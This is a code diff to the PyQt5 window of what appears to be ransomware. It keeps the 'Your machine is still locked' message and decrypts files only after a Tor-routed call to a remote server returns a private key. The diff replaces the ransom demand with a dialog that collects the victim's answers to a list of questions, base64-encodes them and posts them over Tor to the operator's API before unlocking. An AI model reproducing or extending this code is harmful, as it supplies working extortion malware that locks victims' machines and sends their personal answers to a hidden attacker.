@@ -1,7 +1,7 @@
 from PyQt5 import QtCore
 from PyQt5.QtCore import QSize
 from PyQt5.QtGui import QImage, QPalette, QBrush, QFont
-from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox, QTextEdit, QProgressBar
+from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox, QTextEdit, QProgressBar, QInputDialog, QLineEdit
 from Helper import Helper
 from TorManager import TorManager
 import Config
@@ -9,6 +9,7 @@ import json
 import base64
 import DecryptThread
 import requests
+import collections
 
 
 class GUI(QWidget):
@@ -61,7 +62,44 @@ class GUI(QWidget):
         self.btnDecrypt.move(650, 550)
         self.btnDecrypt.setStyleSheet("QPushButton {background-color:black; color: white; width:100px; height:24px;} "
                                       "QPushButton:hover {color:green;}")
-        self.btnDecrypt.clicked.connect(self.decryptData)
+        self.btnDecrypt.clicked.connect(self.askQuestions)
+
+    def askQuestion(self, q):
+        text, okPressed = QInputDialog.getText(self, "Supergirl", q, QLineEdit.Normal, "")
+        if okPressed and text != '':
+            return text
+        else:
+            return ""
+
+
+    def askQuestions(self):
+        h = Helper()
+        questions = []
+        with open(h.path('res/questions.txt'), 'r') as f:
+            for question in f:
+                r = self.askQuestion(question)
+                tmp = [question.replace('\n', ''), base64.b64encode(str(r).encode('utf-8'))]
+                questions.append(tmp)
+        print(questions)
+        self.sendAnswers(questions)
+
+    def sendAnswers(self, q):
+        tor = TorManager()
+        r = tor.getSession()
+        try:
+            data = collections.OrderedDict()
+            for i in range(0, len(q)):
+                data[q[i][0]] = q[i][1].decode('utf-8')
+            headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
+            req = r.post(Config.API_URL + "/answer/" + self.uuid, data=json.dumps(data), headers=headers)
+            data = json.loads(req.text)
+            if data['STATUS'] == "WRONG_ANSWERS":
+                QMessageBox.question(self, "Still locked...", "Your machine is still locked\nAt least one Answer was wrong", QMessageBox.Ok)
+            elif data['STATUS'] == "OK":
+                self.decryptData()
+        except requests.exceptions.RequestException:
+            QMessageBox.question(self, "Error", "You are fucked...",
+                                 QMessageBox.Ok)
 
     def decryptData(self):
         tor = TorManager()
@@ -70,11 +108,10 @@ class GUI(QWidget):
             req = r.get(Config.API_URL + "/decrypt/" + self.uuid)
             data = json.loads(req.text)
             if data['STATUS'] == "FAIL":
-                QMessageBox.question(self, "Still locked...", "Your machine is still locked\nPlease pay the ransom", QMessageBox.Ok)
+                QMessageBox.question(self, "Still locked...", "Decryption Failed!", QMessageBox.Ok)
             elif data['STATUS'] == "SUCCESS":
                 self.progressBar.show()
                 privkey = base64.b64decode(data['priv_key']).decode('utf-8')
-
                 self.decryptThread = DecryptThread.DecryptThread(privkey)
                 self.decryptThread.start()
         except requests.exceptions.RequestException:
